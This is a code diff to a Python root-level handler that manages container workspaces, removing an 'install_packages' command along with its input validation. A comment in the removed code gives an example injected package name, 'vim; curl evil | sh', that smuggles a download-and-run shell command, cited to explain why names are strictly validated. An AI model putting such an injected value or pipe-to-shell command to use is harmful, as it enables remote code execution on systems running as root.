@@ -100,7 +100,7 @@ WantedBy=multi-user.target
 """
 
 VERBS = {"provision", "archive", "restore", "destroy",
-         "expose_port", "unexpose_port", "install_packages",
+         "expose_port", "unexpose_port",
          "service_ssh", "service_rdp", "service_hermes",
          "fs_list", "fs_pull", "fs_push", "fs_mkdir", "fs_delete",
          "fs_archive", "apt_repair", "ai_claude", "ai_usage", "reset", "ping"}
@@ -827,32 +827,6 @@ def handle(req: dict) -> dict:
         if not net_ok:
             out = f"{net_out}\n{out}"
         return {"ok": ok, "output": out}
-
-    if verb == "install_packages":
-        # Independent validation. The API validates too, but this side runs as
-        # root and must never rely on the caller having done so: a name like
-        # "vim; curl evil | sh" has to be unrepresentable here, not merely
-        # escaped somewhere upstream.
-        names = req.get("packages") or []
-        if not isinstance(names, list) or not names:
-            return {"ok": False, "error": "packages must be a non-empty list"}
-        if len(names) > 40:
-            return {"ok": False, "error": "too many packages"}
-        clean = []
-        for n in names:
-            n = str(n).strip().lower()
-            if not re.fullmatch(r"[a-z0-9][a-z0-9+.\-]{0,60}", n):
-                return {"ok": False, "error": f"invalid package name: {n[:40]!r}"}
-            clean.append(n)
-        # Passed as separate argv entries, never through a shell string.
-        ok, out = _run([
-            "incus", "exec", "ws", "--project", project,
-            "--env", "DEBIAN_FRONTEND=noninteractive", "--",
-            "bash", "-lc",
-            "apt-get update -qq && apt-get install -y -qq --no-install-recommends "
-            + " ".join(clean),
-        ], timeout=900)
-        return {"ok": ok, "output": out[-2000:], "packages": clean}
 
     if verb == "service_ssh":
         action = req.get("action")
